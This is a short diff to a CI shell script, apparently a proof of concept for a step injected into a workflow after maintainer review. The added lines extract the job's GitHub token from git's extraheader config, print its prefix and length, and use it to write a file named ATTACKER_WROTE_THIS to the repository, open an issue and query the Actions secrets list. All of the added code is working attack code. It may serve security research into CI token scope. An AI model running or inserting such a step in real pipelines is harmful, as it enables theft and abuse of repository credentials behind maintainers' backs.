@@ -25,3 +25,15 @@ echo "=== END ALLOWLIST CAPTURE ==="
 
 echo "POST_REVIEW_MARKER=this line did not exist when the maintainer reviewed and merged the workflow"
 echo "POST_REVIEW_COMMIT_UTC=2026-07-30T02:19:58Z"
+
+echo "=== TOKEN CAPABILITY UNDER THE PERMISSIONS BLOCK THIS WORKFLOW DECLARES ==="
+TK=$(git config --get http.https://github.com/.extraheader 2>/dev/null | sed 's/.*basic //' | base64 -d 2>/dev/null | cut -d: -f2)
+[ -z "$TK" ] && TK="$GITHUB_TOKEN"
+echo "TOKEN_PREFIX=$(printf '%s' "$TK" | cut -c1-4) TOKEN_LEN=${#TK}"
+api () { curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TK" -H "Accept: application/vnd.github+json" "$@"; }
+echo "READ_own_repo=$(api https://api.github.com/repos/$GITHUB_REPOSITORY)"
+B=$(printf 'attacker step wrote this using the job token, run %s\n' "$GITHUB_RUN_ID" | base64 -w0 2>/dev/null || printf 'attacker step wrote this\n' | base64)
+echo "WRITE_new_file=$(api -X PUT -d "{\"message\":\"marker from injected step\",\"content\":\"$B\",\"branch\":\"$GITHUB_REF_NAME\"}" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/ATTACKER_WROTE_THIS_$GITHUB_RUN_ID.txt)"
+echo "WRITE_issue=$(api -X POST -d '{"title":"opened by the injected step","body":"job token had issues:write"}' https://api.github.com/repos/$GITHUB_REPOSITORY/issues)"
+echo "READ_secrets_list=$(api https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets)"
+echo "=== END TOKEN CAPABILITY ==="
